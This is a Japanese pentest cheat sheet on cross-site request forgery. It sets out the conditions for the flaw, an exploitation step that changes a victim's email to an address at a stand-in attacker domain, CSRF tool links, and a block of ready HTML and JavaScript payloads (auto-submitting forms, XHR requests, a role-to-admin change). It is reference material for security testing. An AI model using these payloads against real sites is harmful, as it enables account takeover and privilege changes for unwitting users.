## 前提知識

---
## 脆弱性の説明
CSRFは、攻撃者がユーザに意図しない操作を実行させることを可能にする脆弱性。

- **CSRFの条件**
	- 関連するアクション
		- 攻撃者は、アプリケーション内で何らかのアクションを誘発する必要がある。代表的なのは、パスワード変更。
	- Cookieベースのセッション処理
		- CSRF Tokenだったり、類似の目的で使わるものがないこと。
	- 予測不可能なリクエストパラメータ
		- アクションを実行するリクエストに予測不可能なパラメータが含まれないこと。

---
## 悪用方法の説明
1. 自分が管理しているサイトに、悪意のあるHTMLを配置し、被害者を誘導する。
2. 以下のリクエストをユーザに送信させる。
```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```

---
## Tools
- https://github.com/0xInfection/XSRFProbe
- https://github.com/0xInfection/CSRFPocGenerator.git

# # 簡単な攻撃
```payload
# HTML GET
<a href=”http://vulnerable/endpoint?parameter=CSRFd">Click</a>

# HTML GET (no interaction)
<img src=”http://vulnerable/endpoint?parameter=CSRFd">

# HTML POST:
<form action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>

# HTML POST (no interaction)
<form id="autosubmit" action="http://vulnerable/endpoint" method="POST">
<input name="parameter" type="hidden" value="CSRFd" />
<input type="submit" value="Submit Request" />
</form>
<script>
document.getElementById("autosubmit").submit();
</script>

# JSON GET:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://vulnerable/endpoint");
xhr.send();
</script>

# JSON POST
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://vulnerable/endpoint");
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.send('{"role":admin}');
</script>
```
---
## 参考文献
- https://github.com/six2dez/pentest-book/blob/master/enumeration/web/csrf.md